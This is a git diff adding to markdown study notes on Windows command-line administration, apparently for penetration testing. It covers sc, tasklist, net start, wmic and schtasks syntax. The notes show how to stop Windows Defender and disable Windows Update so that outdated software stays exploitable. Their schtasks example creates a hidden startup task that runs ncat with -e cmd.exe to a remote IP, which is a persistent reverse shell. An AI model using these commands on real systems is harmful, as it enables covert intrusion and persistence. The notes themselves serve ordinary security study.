@@ -308,19 +308,129 @@ setting a variable to an empty string is the way to delete them
 | %ProgramFiles(x86)% | 	Equivalent of C:\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture) | 
 
 ## Managing Services
-The service controller program `sc` allows the user to 
+The service controller program `sc` allows the user to: 
 * Determine what services are running
 * Modify existing services
 * disable/ enable running services
 
-`sc` works by giving it queries. We can query it by
+`sc` works by giving it queries. We can query it by:
 * process state
 * process id
 * service type
 
-`sc query type= service` lists all running services
+`sc query type= service` lists all running services ( Notice the space between `=` and "service" syntax wise this space is not optional! )
+
 `sc query windefend` displays windefend also known as Windows Defender.
+
 `sc stop windefend` stops the specified process, might require admin priviledges or even System.
+
 `sc start windefend` starts the specified process, might require admin priviledges
- 
- 
+
+we can also configure services with sc:
+`sc config wuauserv start= disabled` we have now disabled this service (windows update) so it cant start.
+
+if someone tries 
+```
+sc start wuauserv
+[SC] StartService FAILED 1058:
+
+The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
+``` 
+This can be very useful if the host you are doing this on is running outdated software, which you intend to exploit.
+
+you can undo the disabled command with a new start type `start= auto`
+
+Remember to be careful. Disabling services is bound to be monitorized by a good blue team especially the essential services that comes with Windows. 
+
+### Tasklist
+`tasklist` can be used to print all running processe to the terminal. pipe with `| find "something"` to filter.
+use the `/svc` switch to only list running services.
+
+
+### Net Start
+`net start` list all running services on our system. `net stop` `net pause` `net continue` are also valid commands with `net`.
+
+### WMIC 
+The Windows Management Instrumental Command is a big CLI executable with a lot of features. 
+`wmic service list brief`
+(This tool is however deprecated)
+
+## Working with Scheduled Tasks
+Scheduled Tasks is as the name implies: command(s) that are set to run in an automated frequency. 
+
+These are great for automating maintainance on a system.
+* Deleting old log files
+* Taking backups 
+* Health Checks
+
+But they can also be used for malicious activities. Like persistance on a system. 
+
+### Triggers That Can Kick Off a Scheduled Task
+* When a specific system event occurs.
+* At a specific time.
+* At a specific time on a daily schedule.
+* At a specific time on a weekly schedule.
+* At a specific time on a monthly schedule.
+* At a specific time on a monthly day-of-week schedule.
+* When the computer enters an idle state.
+* When the task is registered.
+* When the system is booted.
+* When a user logs on.
+* When a Terminal Server session changes state.
+
+### How to Utilize Scheduled Tasks 
+`schtasks` 
+
+### Query Syntax
+| Action | 	Parameter |	Description |
+| ----- | --------- |------------- |
+|Query 	|	|Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
+|	|/fo 	|Sets formatting options. We can specify to show results in the Table, List, or CSV output.|
+||	/v 	|Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter.|
+||	/nh 	|Simplifies the output using the Table or CSV output format. This switch removes the column headers.|
+||	/s 	|Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as "\\\host".|
+||	/u 	|This switch will tell schtasks to run the following command with the permission set of the user specified.|
+||	/p 	|Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The u and p values are only valid when used with the s parameter.|
+
+`SCHTASKS /Query /V /FO list` this command can be run with 
+
+### Create Syntax
+|Action |	Parameter |	Description |
+| ----- | ------- | ---------- |
+|Create |	|	Schedules a task to run.|
+||	/sc |	Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.|
+||	/tn |	Sets the name for the task we are building. Each task must have a unique name.|
+||	/tr |	Sets the trigger and task that should be run. This can be an executable, script, or batch file.|
+||	/s 	|Specify the host to run on, much like in Query.|
+||	/u 	|Specifies the local user or domain user to utilize |
+||	/p 	|Sets the Password of the user-specified.|
+||	/mo |	Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day. |
+||	/rl |	Allows us to limit the privileges of the task. Options here are limited access and Highest. Limited is the default value.|
+||	/z |	Will set the task to be deleted after completion of its actions.|
+
+Example:
+
+`schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100 -e cmd.exe"` This scheduled task will triger on startup, be called "My Secret Task" and run ncat.exe with 172.16.1.100 (ip) and 8100 (port).
+
+### Change Syntax
+|Action |	Parameter |	Description|
+|----- |	----- |	-----|
+|Change| |		Allows for modifying existing scheduled tasks.|
+||	/tn |	Designates the task to change|
+||	/tr |	Modifies the program or action that the task runs.|
+||	/ENABLE |	Change the state of the task to Enabled.|
+||	/DISABLE |	Change the state of the task to Disabled.|
+
+### Delete Syntax
+|Action |	Parameter |	Description|
+|------|---------|----------|
+|Delete|| 		Remove a task from the schedule|
+||	/tn| 	Identifies the task to delete.|
+||	/s 	|Specifies the name or IP address to delete the task from.|
+||	/u 	|Specifies the user to run the task as.|
+||	/p 	|Specifies the password to run the task as.|
+||	/f 	|Stops the confirmation warning.|
+
+# CMD vs PowerShell
+Up until now we have looked at the built-in windows command line cmd.exe. From now we will be looking at it successor PowerShell.
+
